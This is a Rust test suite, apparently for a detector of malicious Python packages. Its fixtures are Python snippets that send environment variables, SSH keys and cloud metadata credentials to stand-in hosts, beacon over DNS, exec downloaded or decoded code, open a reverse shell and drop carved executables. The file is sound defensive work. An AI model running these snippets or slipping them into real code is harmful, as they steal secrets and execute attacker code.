            "{}class C:\n    def __init__(self):\n        self.items = []\n    def collect(self):\n        self.items.append(getpass.getuser())\n    def send(self):\n        {}C().send()\n",
            head,
            post("','.join(self.items)")
        );
        assert_eq!(sent(&src), found("identity", "user or host name"));
        // an object's container, a container in a container
        let src = format!("{}class O: pass\no = O()\no.info = {{}}\no.info.update({{'h': platform.node()}})\n{}", head, post("o.info"));
        assert_eq!(sent(&src), found("identity", "user or host name"));
        let src = format!("{}d = {{'meta': {{}}}}\nd['meta']['h'] = socket.gethostname()\n{}", head, post("d"));
        assert_eq!(sent(&src), found("identity", "user or host name"));
        // a variable of the function around: nonlocal, or its container filled
        let src = format!(
            "{}def outer():\n    data = {{}}\n    def collect():\n        nonlocal data\n        data = {{'h': socket.gethostname()}}\n    collect()\n    {}outer()\n",
            head,
            post("data")
        );
        assert_eq!(sent(&src), found("identity", "user or host name"));
        let src = format!(
            "{}def outer():\n    info = {{}}\n    def add():\n        info['h'] = socket.gethostname()\n    add()\n    {}outer()\n",
            head,
            post("info")
        );
        assert_eq!(sent(&src), found("identity", "user or host name"));
        // a class's body runs when it is defined; its assignments are its attributes
        assert_eq!(sent(&format!("{}class Beacon:\n    {}", head, post("socket.gethostname()"))), found("identity", "user or host name"));
        let src = format!("{}class B:\n    host = socket.gethostname()\n    def go(self):\n        {}B().go()\n", head, post("self.host"));
        assert_eq!(sent(&src), found("identity", "user or host name"));
        // a DNS lookup of a composed name kept in a variable: the payload in
        // chunks of hex, one lookup each (a dependency-confusion beacon)
        let src = format!(
            "import socket, getpass, json\ndata = json.dumps({{'h': socket.gethostname(), 'u': getpass.getuser()}})\nhex_str = data.encode().hex()\nparts = [hex_str[i * 60:(i + 1) * 60] for i in range(len(hex_str) // 60 + 1)]\nfor n, value in enumerate(parts):\n    name = f'v.{{n}}.{{value}}.{}'\n    socket.getaddrinfo(name, 80)\n",
            HOST
        );
        assert_eq!(sent(&src), found("identity", "user or host name"));
        // (the machine's own name looked up, kept in a variable: no send)
        assert_eq!(sent("import socket\nh = socket.gethostname()\nsocket.gethostbyname(h)\n"), None);
        // (a container given nothing of the machine's stays clean)
        let src = format!("{}class C:\n    def __init__(self):\n        self.info = {{}}\n    def collect(self):\n        self.info['v'] = '1.0'\n    def send(self):\n        {}C().send()\n", head, post("self.info"));
        assert_eq!(sent(&src), None);
    }

    #[test]
    fn files_commands_and_the_cloud() {
        let head = "import os, subprocess, requests\n";
        let src = format!("{}k = open(os.path.expanduser('~/.ssh/id_rsa')).read()\n{}", head, post("k"));
        assert_eq!(sent(&src), found("file", "os.path.expanduser('~/.ssh/id_rsa')"));
        // a name given the path: what it was given names the credential store
        let src = format!("{}p = os.path.join(os.path.expanduser('~'), '.ssh', 'id_rsa')\nwith open(p) as f:\n    k = f.read()\n{}", head, post("k"));
        assert_eq!(sent(&src), found("file", "os.path.join(os.path.expanduser('~'), '.ssh', 'id_rsa')"));
        // a file of the package is not local data
        assert_eq!(sent(&format!("{}{}", head, post("open(os.path.join(os.path.dirname(__file__), 'v.txt')).read()"))), None);
        // a file opened to append and read is read; one opened to write only is not
        let src = format!("{}f = open(os.path.expanduser('~/.bash_history'), 'a+')\nf.seek(0)\n{}", head, post("f.read()"));
        assert_eq!(sent(&src), found("file", "os.path.expanduser('~/.bash_history')"));
        let src = format!("{}f = open(os.path.expanduser('~/.cache/x'), 'w')\n{}", head, post("str(f)"));
        assert_eq!(sent(&src), None);
        // what a command prints; from a constant list; through the script's wrapper
        assert_eq!(sent(&format!("{}{}", head, post("subprocess.check_output(['ps', 'aux'])"))), found("report", "ps"));
        let src = format!("{}out = ''\nfor c in ['whoami', 'id']:\n    out += subprocess.getoutput(c)\n{}", head, post("out"));
        assert_eq!(sent(&src), found("identity", "whoami"));
        let src = format!("{}def run(c):\n    return subprocess.check_output(c, shell=True).decode()\n{}", head, post("run('whoami')"));
        assert_eq!(sent(&src), found("identity", "whoami"));
        // the instance's credentials
        let src = format!("{}c = requests.get('http://169.254.169.254/latest/meta-data/iam/').text\n{}", head, post("c"));
        assert_eq!(sent(&src), found("credentials", "the instance's metadata"));
    }

    #[test]
    fn sends_by_what_makes_them() {
        // a raw socket; a session; a DNS lookup of a composed name, not of the name alone
        let src = "import socket\ns = socket.socket()\ns.connect(('203.0.113.7', 4444))\ns.sendall(socket.gethostname().encode())\n";
        assert_eq!(sent(src), found("identity", "user or host name"));
        let src = format!("import os, requests\nwith requests.Session() as s:\n    s.post('https://{}/c', json=dict(os.environ))\n", HOST);
        assert_eq!(sent(&src), found("environment", "the whole environment"));
        let src = format!("import socket\nh = socket.gethostname()\nsocket.gethostbyname(f'{{h}}.x.{}')\n", HOST);
        assert_eq!(sent(&src), found("identity", "user or host name"));
        assert_eq!(sent("import socket\nsocket.gethostbyname(socket.gethostname())\n"), None);
        // a host name built from the data is resolved: sent
        let src = format!("import socket, requests\nh = socket.gethostname()\nrequests.get(f'https://{{h}}.{}/x')\n", HOST);
        assert_eq!(sent(&src), found("identity", "user or host name"));
        // a key in a header: only an address holds it
        let src = format!("import os, requests\nrequests.get('https://{}/c', headers={{'k': os.environ['API_KEY']}})\n", HOST);
        assert_eq!(sent(&src), Some(("environment", "API_KEY".to_string(), true)));
        // a length is not the data
        assert_eq!(sent(&format!("import os, requests\n{}", post("len(str(os.environ))"))), None);
    }

    #[test]
    fn code_it_receives_run_loaded_or_deserialized() {
        assert_eq!(runs("import requests\nexec(requests.get('https://x.invalid/p').text)\n"), Some("run"));
        assert_eq!(runs("import urllib.request\nexec(urllib.request.urlopen('https://x.invalid/p').read())\n"), Some("run"));
        assert_eq!(runs("import base64, requests\nexec(base64.b64decode(requests.get('https://x.invalid/p').content))\n"), Some("run"));
        assert_eq!(runs("import pickle, requests\npickle.loads(requests.get('https://x.invalid/p').content)\n"), Some("deserialize"));
        assert_eq!(runs("import importlib, requests\nimportlib.import_module(requests.get('https://x.invalid/p').text)\n"), Some("import"));
        assert_eq!(runs("import os, requests\nos.system(requests.get('https://x.invalid/p').text)\n"), Some("run"));
        assert_eq!(runs("import subprocess, sys, requests\nc = requests.get('https://x.invalid/p').text\nsubprocess.run([sys.executable, '-c', c])\n"), Some("run"));
        assert_eq!(runs("import subprocess\nexec(subprocess.check_output(['curl', '-s', 'https://x.invalid/p']))\n"), Some("run"));
        assert_eq!(runs("import socket\ns = socket.socket()\ns.connect(('h', 1))\nexec(s.recv(4096))\n"), Some("run"));
        let src = "import aiohttp\nasync def main():\n    async with aiohttp.ClientSession() as s:\n        async with s.get('https://x.invalid/p') as r:\n            exec(await r.text())\n";
        assert_eq!(runs(src), Some("run"));
        // the script's own downloader, and a loader given its own address
        assert_eq!(runs("import requests\ndef get(u):\n    return requests.get(u).text\nexec(get('https://x.invalid/p'))\n"), Some("run"));
        assert_eq!(runs("import requests\ndef load(u):\n    exec(requests.get(u).text)\nload('https://x.invalid/p')\n"), Some("run"));
        // a library's loader for its caller; a fixed program given the data; a safe loader
        assert_eq!(runs("import requests\ndef load(u):\n    exec(requests.get(u).text)\n"), None);
        assert_eq!(runs("import requests\nclass C:\n    def run(self):\n        exec(requests.get(self.url).text)\n"), None);
        assert_eq!(runs("import os, requests\nd = requests.get('https://x.invalid/p').text\nos.system('curl -d ' + d + ' https://y.invalid')\n"), None);
        assert_eq!(runs("import yaml, requests\nyaml.load(requests.get('https://x.invalid/p').text, Loader=yaml.SafeLoader)\n"), None);
    }

    #[test]
    fn request_objects_and_what_objects_hold() {
        // a request object given its data afterwards (s3transfer-sl's setup.py)
        let src = "import os, json, urllib.request\ndef send_post(url, data=None):\n    req = urllib.request.Request(url)\n\
                   \x20   if data:\n        req.data = data.encode('utf-8')\n    with urllib.request.urlopen(req) as r:\n        return r.read()\n\
                   send_post('https://webhook.site/x', data=json.dumps(dict(os.environ)))\n";
        assert_eq!(sent(src), found("environment", "the whole environment"));
        // the instance's metadata asked through a request object, then sent on
        let src = "from urllib import request, parse\n\
                   m = request.urlopen(request.Request('http://172.17.0.2/computeMetadata/v1/token', headers={'Metadata-Flavor': 'Google'}))\n\
                   body = m.read().decode()\n\
                   request.urlopen(request.Request('https://x.invalid/c', data=parse.urlencode({'t': body}).encode()))\n";
        assert_eq!(sent(src), found("credentials", "the instance's metadata"));
        // a session made where the model doesn't see, by its name
        let src = format!("import os\nclient = make_client()\nclient.post('https://{}/c', json=dict(os.environ))\n", HOST);
        assert_eq!(sent(&src), found("environment", "the whole environment"));
    }

    #[test]
    fn what_is_not_the_data() {
        // a path made, not read; what a file holds is not what its path was made of
        let src = format!("import os, requests\nfrom pathlib import Path\nd = Path(os.getenv('APP_TOKEN_DIR'))\n{}", post("str(d)"));
        assert_eq!(sent(&src), None);
        let src = format!("import os, requests\nt = open(os.path.join(os.getenv('APP_TOKEN_DIR'), 'auth.json')).read()\n{}", post("t"));
        assert_eq!(sent(&src), None);
        // the environment a call is given as env= is a program's
        let src = format!("import os, requests\nr = make_wheel(env=os.environ)\n{}", post("r"));
        assert_eq!(sent(&src), None);
        // the script's wrapper given its command by keyword
        let src = format!("import subprocess, requests\ndef run(cmd):\n    return subprocess.getoutput(cmd)\n{}", post("run(cmd='whoami')"));
        assert_eq!(sent(&src), found("identity", "whoami"));
    }

    #[test]
    fn a_reverse_shell_runs_what_it_receives() {
        let src = "from socket import socket\nfrom subprocess import run, PIPE\ns = socket()\ns.connect(('127.0.0.1', 1337))\n\
                   command = s.recv(65535).decode()\np = run(command, shell=True, stdout=PIPE)\n";
        assert_eq!(runs(src), Some("run"));
        // (a fixed program given what it receives as an argument runs no code it receives)
        let src = "from socket import socket\nfrom subprocess import run\ns = socket()\nname = s.recv(64).decode()\nrun(['ls', name])\n";
        assert_eq!(runs(src), None);
    }

    #[test]
    fn runners_under_other_names() {
        // an alias, getattr, a namespace's dictionary, globals(), a snippet without its import
        assert_eq!(runs("import os, requests\ns = os.system\ns(requests.get('https://x.invalid/p').text)\n"), Some("run"));
        assert_eq!(runs("import requests\nexec(getattr(requests, 'get')('https://x.invalid/p').text)\n"), Some("run"));
        assert_eq!(runs("import builtins, requests\ngetattr(builtins, 'exec')(requests.get('https://x.invalid/p').text)\n"), Some("run"));
        assert_eq!(runs("import requests\n__builtins__.__dict__['exec'](requests.get('https://x.invalid/p').text)\n"), Some("run"));
        assert_eq!(runs("import requests\nglobals()['eval'](requests.get('https://x.invalid/p').text)\n"), Some("run"));
        assert_eq!(runs("exec(urlopen('https://x.invalid/p').read())\n"), Some("run"));
        // a parameter named like a library's function is the caller's
        assert_eq!(runs("def f(urlopen):\n    exec(urlopen('https://x.invalid/p').read())\n"), None);
        // a variable of the environment holds what the script stores in it
        assert_eq!(runs("import os, requests\nos.environ['P'] = requests.get('https://x.invalid/p').text\nexec(os.getenv('P'))\n"), Some("run"));
    }

    #[test]
    fn evasions_of_the_text_follower() {
        // triple quotes in a comment begin no string
        let src = "# the \"\"\" quotes\nimport os, urllib.request\n\
                   urllib.request.urlopen('https://collector.invalid/x', data=str(dict(os.environ)).encode())\n# end \"\"\"\n";
        assert_eq!(sent(src), found("environment", "the whole environment"));
        // padding between the read and the send
        let mut src = String::from("import os, requests\nd = dict(os.environ)\n");
        for k in 0..3000 {
            src.push_str(&format!("x{} = {}\n", k, k));
        }
        src.push_str(&post("d"));
        assert_eq!(sent(&src), found("environment", "the whole environment"));
    }

    /// The lines of the code the text decodes and runs (each run's line,
    /// the decoding's).
    fn decoded(src: &str) -> Vec<(usize, usize)> {
        let text: Vec<u32> = src.chars().map(|c| c as u32).collect();
        let line = |at: usize| text[..at.min(text.len())].iter().filter(|&&c| c == 0x0A).count() + 1;
        read(src).decoded.iter().map(|&(at, from)| (line(at), line(from))).collect()
    }

    #[test]
    fn code_it_decodes_and_runs() {
        // a decoder's output run: base64, compression, hex, a decryption, marshal
        assert_eq!(decoded("import base64\nexec(base64.b64decode('cHJpbnQoMSk='))\n"), vec![(2, 2)]);
        assert_eq!(decoded("import base64, zlib\ns = zlib.decompress(base64.b64decode(blob))\nexec(s)\n"), vec![(3, 2)]);
        assert_eq!(decoded("exec(bytes.fromhex('7072696e74283129').decode())\n"), vec![(1, 1)]);
        assert_eq!(decoded("from fernet import Fernet\nexec(Fernet(b'k').decrypt(b'gAAA'))\n"), vec![(2, 2)]);
        assert_eq!(decoded("import marshal\nexec(marshal.loads(b'\\xe3'))\n"), vec![(2, 2)]);
        // decoders by another name: an import alias, __import__, a lambda, the script's function
        assert_eq!(decoded("import base64 as b\nexec(b.b64decode(x))\n"), vec![(2, 2)]);
        let src = "_ = lambda __: __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))\nexec((_)(b'abc'))\n";
        assert_eq!(decoded(src), vec![(2, 1)]);
        let src = "import base64\ndef invoke(s):\n    return base64.b64decode(s)\nexec(invoke('cHJpbnQoMSk='))\n";
        assert_eq!(decoded(src), vec![(4, 3)]);
        // a decoder written out: an XOR loop (pywhool's install command), characters' codes, a reversal
        let src = "class C:\n    def run(self):\n        d = 'abc'\n        k = '042'\n        o = ''\n        for i in range(len(d)):\n            o += chr(ord(d[i]) ^ ord(k[i % len(k)]))\n        eval(compile(o, '<string>', 'exec'))\n";
        assert_eq!(decoded(src).len(), 1);
        assert_eq!(decoded("exec(''.join(map(chr, [112, 114, 105])))\n"), vec![(1, 1)]);
        assert_eq!(decoded("s = ''.join(chr(c) for c in [112, 114, 105])\nexec(s)\n"), vec![(2, 1)]);
        // one character made of its code is no decoding (numpy's f2py: a parameter's value, then eval)
        assert_eq!(decoded("def f(params, n, v):\n    params[n] = chr(params[n])\n    return eval(v, {}, params)\n"), vec![]);
        assert_eq!(decoded("def g(v, params):\n    params['x'] = chr(params['x'])\n    return eval(v + params['x'])\n"), vec![]);
        assert_eq!(decoded("exec(')1(tnirp'[::-1])\n"), vec![(1, 1)]);
        // the package's own file run, a decoded value not run, code in a string: nothing
        assert_eq!(decoded("exec(open('pkg/version.py').read())\n"), vec![]);
        assert_eq!(decoded("import base64\nx = base64.b64decode(data)\nprint(x)\n"), vec![]);
        assert_eq!(decoded("s = \"exec(base64.b64decode('cHJpbnQoMSk='))\"\n"), vec![]);
        // a program it decodes, run (requests-darwin-lite's `ioreg` command); a fixed program given decoded data: nothing
        let src = "import subprocess\nfrom base64 import b64decode\nc = b64decode('aW9yZWc=').decode()\nraw = subprocess.run(c.split(), stdout=subprocess.PIPE)\n";
        assert_eq!(decoded(src), vec![(4, 3)]);
        assert_eq!(decoded("import subprocess, base64\nsubprocess.Popen([base64.b64decode(x).decode(), '-q'])\n"), vec![(2, 2)]);
        assert_eq!(decoded("import subprocess, base64\nsubprocess.run(['git', 'apply', base64.b64decode(x)])\n"), vec![]);
    }

    fn dropped(src: &str) -> Option<(usize, u16, String, Option<String>)> {
        read(src).dropped.map(|d| (d.line, d.kinds, pystr::to_string(&d.what), d.interp.map(|i| pystr::to_string(&i))))
    }

    #[test]
    fn files_it_writes_then_runs() {
        // requests-darwin-lite's shape: a program carved out of an image it ships, written, made executable, run
        let src = "import os, subprocess\nfrom setuptools.command.install import install\nclass PyInstall(install):\n    def run(self):\n        dest = 'docs/_static/logo.png'\n        dest_dir = '/tmp/go-build/exe/'\n        with open(dest, 'rb') as fd:\n            content = fd.read()\n        offset = 306086\n        with open(dest_dir + 'output', 'wb') as fd:\n            fd.write(content[offset:])\n        os.chmod(dest_dir + 'output', 0o755)\n        subprocess.Popen([dest_dir + \"output\"], close_fds=True)\n";
        let (line, kinds, what, interp) = dropped(src).expect("a dropper");
        assert_eq!((line, kinds, what.as_str(), interp), (13, K_CARVED, "docs/_static/logo.png", None));
        // by a path's bytes and a slice of them, a name given the path, os.system
        let src = "import os, pathlib\nblob = pathlib.Path('pkg/data.bin').read_bytes()\np = os.path.join(os.path.expanduser('~'), '.cache', 'helper')\nopen(p, 'wb').write(blob[4096:8192])\nos.system(p)\n";
        assert_eq!(dropped(src).map(|d| (d.0, d.1)), Some((5, K_CARVED)));
        let src = "import os, subprocess\nhere = os.path.dirname(__file__)\nwith open(os.path.join(here, 'docs', 'logo.png'), 'rb') as f:\n    exe = f.read()[4096:]\nopen('/tmp/h', 'wb').write(exe)\nsubprocess.Popen(['/tmp/h'])\n";
        assert_eq!(dropped(src).map(|d| d.2), Some("docs/logo.png".to_string()));
        // a decoded script written, run by Python; a constant path in a command line
        let src = "import base64, subprocess, sys\nf = open('/tmp/x.py', 'w')\nf.write(base64.b64decode(B).decode())\nf.close()\nsubprocess.Popen([sys.executable, '/tmp/x.py'])\n";
        assert_eq!(dropped(src).map(|d| (d.0, d.1 & K_DECODED != 0, d.3)), Some((5, true, Some("Python".into()))));
        let src = "import base64, os\nwith open('/tmp/x.sh', 'w') as f:\n    f.write(base64.b64decode(B).decode())\nos.system('chmod +x /tmp/x.sh && sh /tmp/x.sh')\n";
        assert_eq!(dropped(src).map(|d| (d.0, d.3)), Some((4, Some("sh".into()))));
        // command lines made of parts: after `&&`, an interpreter's script in an f-string
        let src = "import base64, os, tempfile\np = os.path.join(tempfile.gettempdir(), 'u')\nwith open(p, 'wb') as f:\n    f.write(base64.b64decode(B))\nos.system('chmod +x ' + p + ' && ' + p)\n";
        assert_eq!(dropped(src).map(|d| (d.0, d.3)), Some((5, None)));
        let src = "import zlib, subprocess\np = '/tmp/' + NAME\nopen(p, 'w').write(zlib.decompress(B).decode())\nsubprocess.call(f'bash -x {p}', shell=True)\n";
        assert_eq!(dropped(src).map(|d| (d.0, d.3)), Some((4, Some("bash".into()))));
        // a download written and run: a script by an interpreter, not a program (installers of binaries do that)
        let src = "import requests, subprocess\nr = requests.get('https://example.invalid/i.py')\nopen('i.py', 'wb').write(r.content)\nsubprocess.run(['python3', 'i.py'])\n";
        assert_eq!(dropped(src).map(|d| (d.0, d.1, d.3)), Some((4, K_RECEIVED, Some("Python".into()))));
        let src = "import requests, subprocess, os\nr = requests.get('https://example.invalid/tool')\nopen('bin/tool', 'wb').write(r.content)\nos.chmod('bin/tool', 0o755)\nsubprocess.run(['bin/tool', '--version'])\n";
        assert_eq!(dropped(src), None);
        // cmd runs a batch file as a script, anything else as a program
        let src = "import urllib.request, subprocess\nurllib.request.urlretrieve('https://example.invalid/x', 'x.BAT')\nsubprocess.run('cmd /c x.BAT', shell=True)\n";
        assert_eq!(dropped(src).map(|d| (d.0, d.3)), Some((3, Some("cmd".into()))));
        let src = "import urllib.request, subprocess\nurllib.request.urlretrieve('https://example.invalid/x', 'setup.exe')\nsubprocess.run('cmd /c setup.exe /S', shell=True)\n";
        assert_eq!(dropped(src), None);
        // the write in one function, the run in another; a local name of another function is not the path
        let src = "import base64, subprocess\nP = '/tmp/.x'\ndef put():\n    with open(P, 'wb') as f:\n        f.write(base64.b64decode(B))\ndef go():\n    subprocess.Popen([P])\nput()\ngo()\n";
        assert_eq!(dropped(src).map(|d| d.0), Some(7));
        let src = "import base64, subprocess\ndef save(data):\n    path = 'out.bin'\n    open(path, 'wb').write(base64.b64decode(data))\ndef tool(path):\n    subprocess.run([path, '--help'])\n";
        assert_eq!(dropped(src), None);
        // a whole file copied and run, a file of the package read whole, text written: nothing
        let src = "import subprocess\ndata = open('pkg/tool', 'rb').read()\nopen('/tmp/tool', 'wb').write(data)\nsubprocess.run(['/tmp/tool'])\n";
        assert_eq!(dropped(src), None);
        let src = "import subprocess\nopen('/tmp/x.sh', 'w').write('echo hi')\nsubprocess.run(['sh', '/tmp/x.sh'])\n";
        assert_eq!(dropped(src), None);
        // not a write: tarfile's and a browser's open
        let src = "import tarfile, webbrowser, base64, subprocess\nt = tarfile.open('out.tar.gz')\nt.write(base64.b64decode(B))\nsubprocess.run(['tar'])\n";
        assert_eq!(dropped(src), None);
    }

    #[test]
    fn what_popular_packages_do() {
        // a list's reversal reorders its items and decodes nothing (sympy's
        // lambdify, IPython's completer); a string's decodes
        let items = "import sys\nparts = [sys.argv[1], sys.argv[2]]\nexec(''.join(parts[::-1]))\n";
        assert_eq!(decoded(items), vec![]);
        let made = "import sys\nnames = []\nfor a in sys.argv:\n    names.append(a)\nexec(''.join(names[::-1]))\n";
        assert_eq!(decoded(made), vec![]);
        let text = "import sys\ns = sys.argv[1]\nexec(s[::-1])\n";
        assert_eq!(decoded(text), vec![(3, 3)]);
        // an object given os.environ, read by a constant name, a module's
        // or a literal: that variable, as os.environ[name] reads it
        // (kubernetes' in-cluster config, future's urllib backport)
        let config = "import os\nSERVICE_HOST_ENV_NAME = \"KUBERNETES_SERVICE_HOST\"\nSERVICE_PORT_ENV_NAME = \"KUBERNETES_SERVICE_PORT\"\n\
                      def _join_host_port(host, port):\n    template = \"%s:%s\"\n    return template % (host, port)\n\
                      class Loader(object):\n    def __init__(self, token_filename, environ=os.environ):\n        self._environ = environ\n\
                      \x20   def _load_config(self):\n        self.host = (\"https://\" + _join_host_port(self._environ[SERVICE_HOST_ENV_NAME], self._environ[SERVICE_PORT_ENV_NAME]))\n";
        assert_eq!(sent(config), None);
        assert_eq!(sent("import os\ndef load(environ=os.environ):\n    host = \"https://\" + environ[\"KUBERNETES_SERVICE_HOST\"]\n    return host\n"), None);
        let named = format!("import os, requests\nH = \"NPM_TOKEN\"\ndef load(environ=os.environ):\n    {}load()\n", post("environ[H]"));
        assert_eq!(sent(&named), found("environment", "NPM_TOKEN"));
        let whole = format!("import os, requests\ndef load(environ=os.environ):\n    {}load()\n", post("str(environ)"));
        assert_eq!(sent(&whole), found("environment", "the whole environment"));
    }

    /// The line of a text's first run of code it reads back from itself (N-19), if any.
    fn own(src: &str) -> Option<usize> {
        read(src).own.map(|at| src.chars().take(at).filter(|&c| c == '\n').count() + 1)
    }

    #[test]
    fn own_code_run() {
        // its own file, its docstring, its loader's source; a data file shipped with it, read or named
        assert_eq!(own("exec(open(__file__).read().split('#PAYLOAD')[1])\n"), Some(1));
        assert_eq!(own("'''cHJpbnQoMSk='''\nimport base64\nexec(base64.b64decode(__doc__))\n"), Some(3));
        assert_eq!(own("'''eJw='''\nimport base64, zlib\ncode = zlib.decompress(base64.b64decode(__doc__))\nexec(code)\n"), Some(4));
        assert_eq!(own("from pathlib import Path\nexec(Path(__file__).read_text().split('#')[-1])\n"), Some(2));
        assert_eq!(own("exec(__loader__.get_source(__name__).split('##')[1])\n"), Some(1));
        assert_eq!(own("import os\nexec(open(os.path.join(os.path.dirname(__file__), 'logo.png'), 'rb').read()[1024:])\n"), Some(2));
        let named = "import os\np = os.path.join(os.path.dirname(__file__), 'data.bin')\nwith open(p) as f:\n    exec(f.read())\n";
        assert_eq!(own(named), Some(4));
        let parent = "from pathlib import Path\nd = Path(__file__).parent / 'blob.dat'\nexec(d.read_bytes()[64:])\n";
        assert_eq!(own(parent), Some(3));
        // through a function, a shell, an interpreter's -c
        assert_eq!(own("def run(src):\n    exec(src)\n\nrun(open(__file__).read()[100:])\n"), Some(2));
        assert_eq!(own("import os\nos.system(open(os.path.join(os.path.dirname(__file__), 'cmd.txt')).read())\n"), Some(2));
        assert_eq!(own("import subprocess, sys\nsubprocess.run([sys.executable, '-c', open(__file__).read()[500:]])\n"), Some(2));
    }

    #[test]
    fn own_not_code_run() {
        // rumdl 0.2.78's maintainer script (N-19): a usage text from the docstring, and gh run with arguments
        let rumdl = concat!(
            "\"\"\"Update the used-by table.\n\nRe-verify every repo the table already lists.\n\"\"\"\n",
            "import argparse, subprocess\n\n",
            "def run_gh(args, timeout=60):\n",
            "    result = subprocess.run([\"gh\", *args], capture_output=True, text=True, timeout=timeout, check=False)\n",
            "    return result.returncode, result.stdout, result.stderr\n\n",
            "def main():\n",
            "    parser = argparse.ArgumentParser(description=__doc__.split(\"\\n\")[1])\n",
            "    parser.add_argument(\"--repo\")\n",
            "    args = parser.parse_args()\n",
            "    run_gh([\"api\", f\"repos/{args.repo}\"])\n\n",
            "if __name__ == \"__main__\":\n    main()\n",
        );
        assert_eq!(own(rumdl), None);
        // a command line parsed from the usage text, given to a shell
        assert_eq!(own("'''Usage: tool <cmd>'''\nfrom docopt import docopt\nimport os\nargs = docopt(__doc__)\nos.system('git ' + args['<cmd>'])\n"), None);
        let build = "'''Build.'''\nimport argparse, os\nparser = argparse.ArgumentParser(description=__doc__)\nparser.add_argument('target')\nargs = parser.parse_args()\nos.system('make ' + args.target)\n";
        assert_eq!(own(build), None);
        // its docstring printed; its version file run (a module, not a data file)
        assert_eq!(own("'''Tool.'''\nimport sys\nprint(__doc__)\nsys.exit(__doc__)\n"), None);
        assert_eq!(own("import os\nexec(open(os.path.join(os.path.dirname(__file__), 'version.py')).read())\n"), None);
        // a function's parameter is not the module's variable of that name
        assert_eq!(own("src = open(__file__).read()\nprint(len(src))\n\ndef f(src):\n    exec(src)\n\nf('print(1)')\n"), None);
        // a program run with it as input or arguments runs that program
        assert_eq!(own("import subprocess\nsubprocess.run(['wc', '-l'], input=open(__file__).read(), text=True)\n"), None);
    }
}
